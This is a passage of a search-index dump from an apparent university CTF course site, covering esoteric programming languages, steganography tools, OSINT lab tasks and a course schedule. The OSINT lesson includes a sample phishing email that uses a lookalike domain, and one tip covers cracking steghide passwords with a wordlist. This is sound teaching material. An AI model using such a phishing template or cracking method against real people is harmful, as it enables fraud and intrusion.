packets being sent on this guy's computer. He's sending some pretty weird stuff, you should take a look.</p> <p>Flag format: buckeyectf{x}</p> <p>Downloads: keyboardwarrior</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/","title":"Lab 8: Forensics and Steganography Part II","text":"<p>From https://github.com/thezakman/CTF-Heaven</p> <p>By TheZakMan | March 12st, 2021</p> <p>Contents are modified with details</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#esoteric-languages","title":"Esoteric Languages","text":""},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#httpstiorun","title":"https://tio.run/","text":"<p>An online tool that has a ton of Esoteric language interpreters.</p> <p>Some of the languages are regular programming languages, but some of them are esoteric.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#brainfuck","title":"Brainfuck","text":"<p>This language is easily detectable by its huge use of plus signs, braces, and arrows. There are plenty of online interpreters, like this one: https://copy.sh/brainfuck/ Some example code:</p> <pre><code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.--.--------------.+++++++++++++.----.-----------\n--.++++++++++++.--------.&lt;------------.&lt;++.&gt;&gt;----.+.&lt;+++++++++++.+++++++++++++.&gt;+++++++++++++++++.-------------\n--.++++.+++++++++++++++.&lt;&lt;.&gt;&gt;-------.&lt;+++++++++++++++.&gt;+++..++++.--------.+++.&lt;+++.&lt;++++++++++++++++++++++++++\n.&lt;++++++++++++++++++++++.&gt;++++++++++++++..&gt;+.----.&gt;------.+++++++.--------.&lt;+++.&gt;++++++++++++..-------.++.\n</code></pre> <p>The language consists of eight commands, listed below. A brainfuck program is a sequence of these commands, possibly interspersed with other characters (which are ignored). The commands are executed sequentially, with some exceptions: an instruction pointer begins at the first command, and each command it points to is executed, after which it normally moves forward to the next command. The program terminates when the instruction pointer moves past the last command.</p> <p>The brainfuck language uses a simple machine model consisting of the program and instruction pointer, as well as a one-dimensional array of at least 30,000 byte cells initialized to zero; a movable data pointer (initialized to point to the leftmost byte of the array); and two streams of bytes for input and output (most often connected to a keyboard and a monitor respectively, and using the ASCII character encoding).</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#commands","title":"Commands","text":"<p>The eight language commands each consist of a single character:</p> Character Meaning <code>&gt;</code> Increment the data pointer (to point to the next cell to the right). <code>&lt;</code> Decrement the data pointer (to point to the next cell to the left). <code>+</code> Increment (increase by one) the byte at the data pointer. <code>-</code> Decrement (decrease by one) the byte at the data pointer. <code>.</code> Output the byte at the data pointer. <code>,</code> Accept one byte of input, storing its value in the byte at the data pointer. <code>[</code> If the byte at the data pointer is zero, then instead of moving the instruction pointer forward to the next command, jump it forward to the command after the matching <code>]</code> command. <code>]</code> If the byte at the data pointer is nonzero, then instead of moving the instruction pointer forward to the next command, jump it back to the command after the matching <code>[</code> command. <p>(Alternatively, the <code>]</code> command may instead be translated as an unconditional jump to the corresponding <code>[</code> command, or vice versa; programs will behave the same but will run more slowly, due to unnecessary double searching.)</p> <p><code>[</code> and <code>]</code> match as parentheses usually do: each <code>[</code> matches exactly one <code>]</code> and vice versa, the <code>[</code> comes first, and there can be no unmatched <code>[</code> or <code>]</code> between the two.</p> <p>Brainfuck programs can be translated into C using the following substitutions, assuming <code>ptr</code> is of type <code>char*</code> and has been initialized to point to an array of zeroed bytes:</p> brainfuck command C equivalent (Program Start) <code>char array[30000] = {0}; char *ptr = array;</code> <code>&gt;</code> <code>++ptr;</code> <code>&lt;</code> <code>--ptr;</code> <code>+</code> <code>++*ptr;</code> <code>-</code> <code>--*ptr;</code> <code>.</code> <code>putchar(*ptr);</code> <code>,</code> <code>*ptr = getchar();</code> <code>[</code> <code>while (*ptr) {</code> <code>]</code> <code>}</code> <p>As the name suggests, Brainfuck programs tend to be difficult to comprehend. This is partly because any mildly complex task requires a long sequence of commands and partly because the program's text gives no direct indications of the program's state. These, as well as Brainfuck's inefficiency and its limited input/output capabilities, are some of the reasons it is not used for serious programming. Nonetheless, like any Turing complete language, Brainfuck is theoretically capable of computing any computable function or simulating any other computational model, if given access to an unlimited amount of memory.[8] A variety of Brainfuck programs have been written.[9] Although Brainfuck programs, especially complicated ones, are difficult to write, it is quite trivial to write an interpreter for Brainfuck in a more typical language such as C due to its simplicity. There even exist Brainfuck interpreters written in the Brainfuck language itself.[10][11]</p> <p>Brainfuck is an example of a so-called Turing tarpit: It can be used to write any program, but it is not practical to do so, because Brainfuck provides so little abstraction that the programs get very long or complicated.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#malboge","title":"Malboge","text":"<p>An esoteric language that looks a lot like Base85... but isn't. Often has references to \"Inferno\" or \"Hell\" or \"Dante.\" Online interpreters like so: http://www.malbolge.doleczek.pl/ Example code:</p> <pre><code>(=&lt;`#9]~6ZY32Vx/4Rs+0No-&amp;Jk)\"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc\n</code></pre> <p>Malbolge is machine language for a ternary virtual machine, the Malbolge interpreter.</p> <p>The standard interpreter and the official specification do not match perfectly.[11] One difference is that the compiler stops execution with data outside the 33\u2013126 range. Although this was initially considered a bug in the compiler, Ben Olmstead stated that it was intended and there was in fact \"a bug in the specification\".[2]</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#registers","title":"Registers","text":"<p>Malbolge has three registers, a, c, and d. When a program starts, the value of all three registers is zero.</p> <p>a stands for 'accumulator', set to the value written by all write operations on memory and used for standard I/O. c, the code pointer, is special: it points to the current instruction.[12] d is the data pointer. It is automatically incremented after each instruction, but the location it points to is used for the data manipulation commands.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#pointer-notation","title":"Pointer notation","text":"<p>d can hold a memory address; [d] is register indirect; the value stored at that address. [c] is similar.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#memory","title":"Memory","text":"<p>The virtual machine has 59,049 (310) memory locations that can each hold a ten-trit ternary number. Each memory location has an address from 0 to 59048 and can hold a value from 0 to 59048. Incrementing past this limit wraps back to zero.</p> <p>The language uses the same memory space for both data and instructions. This was influenced by how hardware such as x86 architecture worked.[2]</p> <p>Before a Malbolge program starts, the first part of memory is filled with the program. All whitespace in the program is ignored and, to make programming more difficult, everything else in the program must start out as one of the instructions below.</p> <p>The rest of memory is filled by using the crazy operation (see below) on the previous two addresses ([m] = crz [m - 2], [m - 1]). Memory filled this way will repeat every twelve addresses (the individual ternary digits will repeat every three or four addresses, so a group of ternary digits is guaranteed to repeat every twelve).</p> <p>In 2007, \u00d8rjan Johansen created Malbolge Unshackled, a version of Malbolge which does not have the arbitrary memory limit. The hope was to create a Turing-complete language while keeping as much in the spirit of Malbolge as possible. No other rules are changed, and all Malbolge programs that do not reach the memory limit are completely functional.[13]</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#instructions","title":"Instructions","text":"<p>Malbolge has eight instructions. Malbolge figures out which instruction to execute by taking the value [c], adding the value of c to it, and taking the remainder when this is divided by 94. The final result tells the interpreter what to do:</p> Value of ([c] + c) % 94 Instruction represented Explanation 4 jmp [d] Copies the value at [d] to c. Note that c will still be incremented after execution of this instruction, so the next instruction to be executed will be the one at [d] + 1 (modulo 59049). 5 out a Prints the value of a, as an ASCII character, to the screen. 23 in a Inputs a character, as an ASCII code, into a. Newlines or line feeds are both code 10. An end-of-file condition is code 59048. 39 rotr [d] mov a, [d] Rotates the value at [d] by one ternary digit to the right (0002111112 becomes 2000211111). Stores the result both at [d] and in a. 40 mov d, [d] Copies the value at [d] to d. 62 crz [d], a mov a, [d] Does the crazy operation (see below) with the value at [d] and the value of a. Stores the result both at [d] and in a. 68 nop Does nothing. 81 end Ends the Malbolge program. Any other value does the same as 68: nothing. These other values are not allowed in a program while it is being loaded, but are allowed afterwards. <p>After each instruction is executed, the guilty instruction gets encrypted (see below) so that it will not do the same thing next time, unless a jump just happened. Right after a jump, Malbolge will encrypt the innocent instruction just prior to the one it jumped to instead. Then, the values of both c and d are increased by one and the next instruction is executed.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#piet","title":"Piet","text":"<p>A graphical programming language... looks like large 8-bit pixels in a variety of colors. Can be interpreted with the tool <code>npiet</code></p> <p></p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#execution","title":"Execution","text":""},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#codels","title":"Codels","text":"<p>A codel in Piet is like an image's pixel. Some Piet programs are upscaled, meaning that a codel might not always be equivalent to 1 pixel, but a codel is always a substitute for pixels.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#color-blocks","title":"Color blocks","text":"<p>A color block is any group of codels of the same color that are adjacent to each other. Note that codels only touching each other diagonally are not considered part of the same color block; they must be touching in one if the 4 cardinal directions to be part of the same color block.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#direction-pointer","title":"Direction pointer","text":"<p>The direction pointer (DP) is what moves along the program to make it run. It can be in any one of the 4 cardinal directions. The direction pointer always starts at the color block containing the upper-left-most codel, and always starts facing right. After it has executed the proper command, it will move on to the next color block that is both:</p> <ol> <li>adjacent to the current color block, and</li> <li>is the farthest in the direction of the DP.</li> </ol> <p>This continues until the program terminates (see below).</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#codel-chooser","title":"Codel chooser","text":"<p>The codel chooser (CC) is used when multiple color blocks meet the above two criteria for the next block to be executed. Its direction is always relative to the DP's direction, and starts out facing left. When there are more than one possible color blocks to be executed, the one farthest in the direction of the codel chooser (again, relative to the DP) is the one chosen. The codel chooser can only point left or right.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#colors","title":"Colors","text":"<p>Piet uses 20 colors in its programs. Each of these colors (with the exceptions of white and black) have two properties, those being hue and lightness. All colors and their properties are shown in the table below.</p> Light red (#FFC0C0) Light yellow (#FFFFC0) Light green (#C0FFC0) Light cyan (#C0FFFF) Light blue (#C0C0FF) Light magenta (#FFC0FF) Red (#FF0000) Yellow (#FFFF00) Green (#00FF00) Cyan (#00FFFF) Blue (#0000FF) Magenta (#FF00FF) Dark red (#C00000) Dark yellow (#C0C000) Dark green (#00C000) Dark cyan (#00C0C0) Dark blue (#0000C0) Dark magenta (#C000C0) <p>Hue is shown going to the left and lightness is shown going down. Note that these properties are cycles, meaning that, in terms of hue, red comes after magenta. Hue always goes to the left, and lightness always goes down, meaning that going from yellow to red is 5 changes in hue, and vice versa.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#white","title":"White","text":"<p>White (#FFFFFF) is one of the two colors in Piet that doesn't fit into either cycle. White color blocks act like blank spaces. When the DP encounters a white block, it will simply go through it and move on to the next color block. No commands are executed when the DP goes through a white block.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#black","title":"Black","text":"<p>Black (#000000) is like the opposite of white in the sense that the DP cannot pass through it. If the DP tries to go to the next color block but fails because of a black block, it will switch the CC to its other state and try again. If it still can't get to the next color block, then the DP will be rotated one step clockwise. If the DP has gone through all possible states but it still can't get to the next color block, it will conclude there is no way out and the program will terminate. This is the only way to terminate a Piet program.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#commands_1","title":"Commands","text":"<p>Piet commands aren't executed based on the color the DP is on, but instead based on the change in lightness and hue. Below is a table with all 17 commands in Piet and how they're executed.</p> Hue change Light ness change No change 1 darker 2 darker No change N/A Push Pop 1 step Add Subtract Multiply 2 steps Divide Modulo Not 3 steps Greater Pointer Switch 4 steps Duplicate Roll Input num 5 steps Input char Output num Output char <ul> <li>Push: Pushes the number of codels in the previous color block onto the stack.</li> <li>Pop: Pops the top value off the stack.</li> <li>Add: Pops the top two values off the stack, adds them up, and pushes the sum back onto the stack.</li> <li>Subtract: Pops the top two values off the stack, subtracts the top value from the second-top value, and pushes the difference back onto the stack. Note that if the top value is X and the next value Y, this means that Y - X will be pushed, not X - Y.</li> <li>Multiply: Pops the top two values off the stack, multiplies them together, and pushes the product back onto the stack.</li> <li>Divide: Pops the top two values off the stack, performs integer division (Python equivalent of //) on the second-top value divided by the top value, and pushes the quotient back onto the stack. This has the same X/Y property as subtraction.</li> <li>Modulo: Pops the top two values off the stack, divided the second-top value by the top value, and pushes the remainder back onto the stack. This has the same X/Y property as subtraction.</li> <li>Not: Pops the top value off the stack. If the value is 0, it pushes 1 onto the stack. Otherwise, it pushes 0.</li> <li>Greater: Pops the top two values off the stack. If the second-top value is greater than the top value, it pushes 1 onto the stack. Otherwise, it pushes 0. This has the same X/Y property as subtraction.</li> <li>Pointer: Pops the top value off the stack, then rotates the DP one step clockwise that many times (anti-clockwise if the value is negative).</li> <li>Switch: Pops the top value off the stack, then switches the state of the CC that many times (absolute value if the value is negative).</li> <li>Duplicate: Pushes a copy of the top value onto the stack.</li> <li>Roll: Pops the top two values off the stack, and then rotates the top Y values on the stack up by X, wrapping values that pass the top around to the bottom of the rolled portion, where X is the first value popped (top of the stack), and Y is the second value popped (second on the stack). (Example: If the stack is currently 1,2,3, with 3 at the top, and then you push 3 and then 1, and then roll, the new stack is 3,1,2.)</li> <li>Input: Takes an input, either as a character or a number. If the input is a number, that value is pushed onto the stack. If it's a character, its Unicode value is pushed onto the stack.</li> <li>Output: Pops the top value off the stack. If a number should be printed, the value itself will be printed. If a character should be printed, then its corresponding Unicode character will be printed.</li> </ul>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#ook","title":"Ook!","text":"<p>A joke language. Recognizable by <code>.</code> and <code>?</code>, and <code>!</code>.</p> <pre><code>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.\nOok. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.\nOok. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.\nOok! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.\nOok. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?\nOok! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.\n</code></pre> Brainfuck Ook! Description &gt; Ook. Ook? Move the pointer to the right &lt; Ook? Ook. Move the pointer to the left + Ook. Ook. Increment the memory cell under the pointer - Ook! Ook! Decrement the memory cell under the pointer . Ook! Ook. Output the character signified by the cell at the pointer , Ook. Ook! Input a character and store it in the cell at the pointer [ Ook! Ook? Jump past the matching <code>Ook? Ook!</code> if the cell under the pointer is 0 ] Ook? Ook! Jump back to the matching <code>Ook! Ook?</code> n/a Ook? Ook? Give the memory pointer a banana"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#steganography","title":"Steganography","text":""},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#stegcracker","title":"StegCracker","text":"<p>Don't ever forget about <code>steghide</code>! This tool can use a password list like <code>rockyou.txt</code> with steghide. SOME IMAGES CAN HAVE MULTIPLE FILED ENCODED WITH MULTIPLE PASSWORDS.</p> <pre><code>At first, the secret data is compressed and encrypted. Then a sequence  of  postions of pixels in the cover file is created based on a pseudo-random number generator initialized with  the  passphrase (the secret data will be embedded in the pixels at these positions). Of these  positions  those that  do not need to be changed (because they already contain the correct value by chance) are sorted out.  Then  a graph-theoretic  matching  algorithm  finds pairs of positions such that exchanging their values has the effect  of embedding  the  corresponding  part of the secret data. If the  algorithm  cannot  find  any  more  such  pairs   all exchanges  are  actually  performed.   The  pixels  at the remaining positions (the positions that are  not  part  of such  a  pair)  are  also modified to contain the embedded data (but  this  is  done  by  overwriting  them,  not  by exchanging  them  with other pixels).  The fact that (most of) the embedding  is  done  by  exchanging  pixel  values implies  that  the first-order statistics (i.e. the number of times a color occurs in the picture)  is  not  changed. For  audio  files  the  algorithm is the same, except that audio samples are used instead of pixels.\n</code></pre>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#stegsolvejar","title":"<code>Stegsolve.jar</code>","text":"<p>A Java <code>.JAR</code> tool, that will open an image and let you as the user arrow through different renditions of the image (viewing color channels, inverted colors, and more). The tool is surprisingly useful.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#zsteg","title":"<code>zsteg</code>","text":"<p>Command-line tool for use against Least Significant Bit steganography... unfortunately only works against PNG and BMP images.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#morse-code","title":"Morse Code","text":"<p>Always test for this if you are seeing two distinct values... it may not always be binary! Online decoders like so: https://morsecode.scphillips.com/translator.html</p> <p></p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#whitespace","title":"Whitespace","text":"<p>Tabs and spaces could be representing 1's and 0's and treating them as a binary message... or, they could be whitespace done with <code>snow</code> or an esoteric programming language interpreter: https://tio.run/#whitespace</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#dna-codes","title":"DNA Codes","text":"<p>When given a sequence with only A, C, G, T , there is an online mapping for these. Try this:</p> <p> </p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#sonic-visualizer-audio-spectrum","title":"SONIC Visualizer (audio spectrum)","text":"<p>Some classic challenges use an audio file to hide a flag or other sensitive stuff. SONIC visualizer easily shows you spectrogram. If it sounds like there is random bleeps and bloops in the sound, try this tactic!</p> <p></p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#detect-dtmf-tones","title":"Detect DTMF Tones","text":"<p>Audio frequencies common to a phone button, DTMF: https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling.</p> 1209 Hz 1336 Hz 1477 Hz 1633 Hz 697 Hz 1 2 3 A 770 Hz 4 5 6 B 852 Hz 7 8 9 C 941 Hz * 0 # D"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#phone-keypad","title":"Phone-Keypad","text":"<p>Some messages may be hidden with a string of numbers, but really be encoded with old cell phone keypads, like text messaging with numbers repeated:</p> <p></p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#qr-code","title":"QR code","text":"<p>A small square \"barcode\" image that holds data.</p> <p></p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#encoding","title":"Encoding","text":"<p>Meaning of format information. In the above figure, the format information is protected by a (15,5) BCH code, which can correct up to 3-bit errors. The total length of the code is 15 bits, of which 5 are data bits (2 EC level + 3 mask pattern) and 10 are extra bits for error correction. The format mask for these 15 bits is: [101010000010010]. Note that we map the masked values directly to their meaning here, in contrast to image 4 \"Levels &amp; Masks\" where the mask pattern numbers are the result of putting the 3rd to 5th mask bit, [101], over the 3rd to 5th format info bit of the QR code.</p> <p></p> <p>Message placement within a QR symbol. The message is encoded using a (255,249) Reed Solomon code (shortened to (24,18) code by using \"padding\") which can correct up to 3-byte errors.</p> <p></p> <p>The larger symbol illustrates interleaved blocks. The message has 26 data bytes and is encoded using two Reed-Solomon code blocks. Each block is a (255,233) Reed Solomon code (shortened to (35,13) code), which can correct up to 11-byte errors in a single burst, containing 13 data bytes and 22 \"parity\" bytes appended to the data bytes. The two 35-byte Reed-Solomon code blocks are interleaved so it can correct up to 22-byte errors in a single burst (resulting in a total of 70 code bytes). The symbol achieves level H error correction.</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#assignment","title":"Assignment","text":""},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#1-easy-shuodedaoli","title":"(1 - Easy) ShuoDeDaoLi","text":"<p>Don't view the image...</p> <p>attachment</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#2-medium-qr-or-not-qr","title":"(2 - Medium) QR or not QR","text":"<p>QR or not QR, this is a question. However, I can grant the image size is 310 px * 310 px.</p> <p>attachment</p>"},{"location":"CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/#3-medium-cyberpunk-audio","title":"(3 - Medium) Cyberpunk Audio","text":"<p>The music transferred from the moon. The last part sounds corrupted though.</p> <p>attachment</p>"},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/","title":"Lab 9: Open-Source Intelligence","text":"<p>Reference: https://ctfacademy.github.io/osint/index.htm by CTF Academy</p> <p>Reference: https://osintframework.com/ by jnordine</p> <p></p>"},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/#open-source-intelligence","title":"Open Source Intelligence","text":"<p>Open-source intelligence, also known as OSINT, refers to gathering information from publicly available sources, such as social media, company websites, and news articles. There is a great deal of information that can be gathered about a company or person through open-source intelligence.</p>"},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/#osint-techniques","title":"OSINT Techniques","text":"<p>In a cybersecurity context, OSINT can be used to recon a target before performing a penetration test or to generate a report of the information a company is leaking through public sources. Cybercriminals use OSINT to collect information on a target before attacking; also, OSINT can be used to help guess a user\u2019s password. Many people use passwords that relate to themselves. For example, a common password creation method is to use the name of your favorite pet followed by the year you were born. This is a very poor password creation technique because this information is easy for a malicious user to obtain from openly available sources, such as your social media accounts. In addition to possible password information, OSINT can reveal information about a company\u2019s internal computer network. For example, a company\u2019s promotional website may include pictures of employees working. These pictures may reveal information about the company\u2019s inner workings, such as internal website URLs and private documents. OSINT can also be used to create a phony, malicious email targeting a company or individual; these phony emails are referred to as \u201cphishing\u201d emails.</p>"},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/#osint-attack-example","title":"OSINT Attack Example","text":"<p>The following is an example of a company press release and a phishing email created using information from the press release:</p> <pre><code>Company XYZ\n\nRecently Company XYZ has been making astounding progress on a new project. We have been working with many of the finest software engineers to develop a new internet browser with voice control capabilities. A special thanks go out to John Smith from Software ABC Corp. for his assistance with this project (more information can be found at softwareabccorp.com). The expected release date is early 2021.\n\nCompany XYZ,\nSpeaking is the future!\n</code></pre> <p>Using the information in the above press release, an attacker could form the following phishing email:</p> <pre><code>Email\n\nTo: ceo@companyxyz.com\nFrom: jsmith@softwareabccorp.co\nSubject: New Research About Voice Control\n\nDear Company XYZ CEO,\n\nHere is a link to my new research paper about voice control technologies: Softwarecorp.co/newpaper.pdf.\n\nDue to our recent collaboration on your new internet browser, I know this paper will interest you greatly. Please read it and give me your thoughts.\n\n\n\nThank you,\nJohn Smith\nSoftware ABC Corp.\n</code></pre> <p>The attacker would send the above email to the CEO in hopes she would click on the link and unknowingly download the attacker\u2019s malicious file containing a computer virus.</p> <p>The attacker created this email using information gleaned from Company XYZ\u2019s press release. The attacker registered a website and email at \u201csoftwareabccorp.co,\u201d notice the \u201c.co\u201d instead of the \u201c.com\u201d at the end of the address. Also, the name of the researcher connected to the project, John Smith, was mentioned in the press release and was used by the attacker to add believability to his phishing email. Finally, the attacker\u2019s link to a supposed \u201cresearch paper\u201d that would be of interest to the targeted CEO. In a malicious phishing email, this link would lead to a computer virus and infect the CEO\u2019s computer.</p>"},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/#osint-defensive-techniques","title":"OSINT Defensive Techniques","text":"<p>OSINT can also be used defensively. Open source intel can be used to keep up with cybersecurity trends and the techniques cyber criminals are using right now. Many websites provide OSINT about cyber attack trends reported by cybersecurity professionals. Also, when a company is receiving unusual internet traffic, OSINT can be used to determine if the usual traffic is coming from a known malicious IP address (An IP address is a four-part number that identifies the source of a network connection).</p> <p>The following are just a few of the thousands of IP addresses that originate from China:</p> <p>A cyber defender can better analyze unusual internet traffic using public sources about IP address origins.</p> <p>For example, if the network administrator at an organization notices a high volume of internet traffic causing the organization\u2019s website to be overloaded, he can analyze the origins of the internet traffic and determine if the traffic is likely malicious. Using OSINT to research the IP addresses of the internet traffic, a cybersecurity specialist can determine if the traffic originates from known malicious IP addresses.</p> Chinese IP Addresses 36.37.36.114 36.37.39.204 42.1.128.64 <p>A cyber defender can better analyze unusual internet traffic using public sources about IP address origins.</p> <p>For example, if the network administrator at an organization notices a high volume of internet traffic causing the organization\u2019s website to be overloaded, he can analyze the origins of the internet traffic and determine if the traffic is likely malicious. Using OSINT to research the IP addresses of the internet traffic, a cybersecurity specialist can determine if the traffic originates from known malicious IP addresses.</p>"},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/#osint-framework","title":"OSINT Framework","text":"<p>Visit OSINT Framework for OSINT structure and categories.</p>"},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/#assignment","title":"Assignment","text":""},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/#1-easy-emo","title":"(1 - Easy) Emo","text":"<p>In the circle of friends, I found a photo. There is more information than thought.</p> <p>Flag format: flag{[from city]-[to city]-[flight number]}</p> <p>For example: flag{\u6df1\u5733-\u5e7f\u5dde-1A2345}</p> <p>Attachment</p>"},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/#2-easy-travel-photo","title":"(2 - Easy) Travel Photo","text":"<p>I want to travel here too! But how to find the location?</p> <p>Flag format: flag{[city name]-[location name]}</p> <p>For example: flag{\u6df1\u5733-\u6b22\u4e50\u8c37}</p> <p>Attachment</p>"},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/#3-medium-home","title":"(3 - Medium) Home","text":"<p>A photo that was someone's house. A lovely place to live in. However, I want to know the location where this photo was taken.</p> <p>Flag format: flag{[location name]}</p> <p>For example: flag{\u65e0\u4eba\u673a}</p> <p>Attachment</p>"},{"location":"CS315/Lab%209%20Open-Source%20Intelligence/#4-medium-football","title":"(4 - Medium) Football","text":"<p>A real fan can remember this immediately.</p> <p>Flag format: flag{[yyyy-mm-dd]-[location name]}</p> <p>For example: flag{2022-02-30-\u98ce\u96e8\u64cd\u573a}</p> <p>Attachment</p>"},{"location":"CS315/2021/Exercise%20Solutions/","title":"Exercise Solutions","text":"<p>Week 1 solution: PDF</p> <p>Week 2 solution: PDF</p> <p>Week 3 solution: PDF</p> <p>Week 4 solution: PDF</p> <p>Week 5 solution: PDF</p> <p>Week 6 solution: PDF</p> <p>Week 7 solution: PDF</p>"},{"location":"CS315/2021/Overview/","title":"Overview","text":"<p>Capture The Flags, or CTFs, are a kind of computer security competition.</p> <p>Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill.</p> <p>Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend.</p> <p>In this guide/wiki/handbook you'll learn the techniques, thought processes, and methodologies you need to succeed in Capture the Flag competitions.</p>"},{"location":"CS315/2021/Overview/#grading-policy","title":"Grading Policy","text":"Topics Grade Lab1: Forensics 10 Lab2: Buffer Overflow 10 Lab3: Web Information Discovery 10 Lab4: Web Vulnerability Exploit 10 Lab5: De-compiling Program 10 Lab6: Attacking WiFi 10 Lab7: Physical Attacks 10 Lab8: Social Engineering 10 Lab9: Privilege Escalation 10 Lab10: Public Key Crypto Attacking 10 Lab11: Attacking Websites 10 Lab12: ROL and ROP 10 Attack and Defense CTF (bonus) 100"},{"location":"CS315/2021/Overview/#class-schedule","title":"Class Schedule","text":"<p>CTFs in CS315 Course aims to provide an experimental environment. Instructions of CTF components in CS315 are as follow:</p> Date Topic Content File Week 1 CTF Introduction and Forensics 1. Introduce CTF2. Basic Forensics3. Network traffic analysis Week 1.md Week 2 PWN: Basic Buffer Overflow 1. Introduce PWN2. Stack and buffer overflow3. Return to shellcode Week 2.mdWeek 2.pdf Week 3 PWN: Advanced Buffer Overflow 1. Calling conversion2. Binary security3. Bypass canary &amp; PIE Week 3.md Week 4 WEB: Information Discovery 1. Passive information gathering2. Active information gathering Week 4.md Week 5 WEB: Vulnerability Exploit 1. Injection2. Traversal3. CSRF &amp; XSS4. SSRF Week 5.md Week 6 RE: De-compiling Program 1. Assembly2. From C to assembly3. Disassemblers and Decompiles4. Debugging with GDB Week 6.md Week 7 WLAN: Attacking WiFi 1. WiFi attacking tools2. Resume attack3. WiFi crypto attack4. Evil Twin Week 7.md Week 8 MISC: Physical Attacks 1. BIOS2. Bad USB3. Attack printers Week 8.md Week 9 MISC: Social Engineering 1. Cloning a website2. Phishing Week 9.md Week 10 PWN: Privilege Escalation 1. Gather vulnerabilities2. Privilege escalation Week 10.md Week 11 CRYPTO: Public Key Crypto Attacking 1. Traditional crypto2. Hash functions3. RSA Week 11.md Week 12 WEB: Attacking Websites 1. OWASP top 102. Proxies vulnerabilities3. User input vulnerabilities Week 12.md Week 13 PWN: ROL and ROP 1. ROP2. Dynamic ROP chain3. ROL Week 13.md Week 14 CTF: Attack-Defense CTF 1. Introduction2. Environment set3. Grading Week 14.md"},{"location":"CS315/2021/Overview/#contact-me","title":"Contact me","text":"<p>If you have any questions about the CTF part, feel free to contact me : liz33[at]mail.sustech.edu.cn</p>"},{"location":"CS315/2021/Week%201/","title":"Week 1 CTF Introduction and Forensics","text":"<p>According to the @CTF101: https://ctf101.org/</p>"},{"location":"CS315/2021/Week%201/#introduction-to-ctf","title":"Introduction to CTF","text":"<p>Capture The Flags, or CTFs, are a kind of computer security competition.</p> <p>Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill.</p> <p>Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend.</p> <p></p> <p>Figure: CTFs on the CTFtime 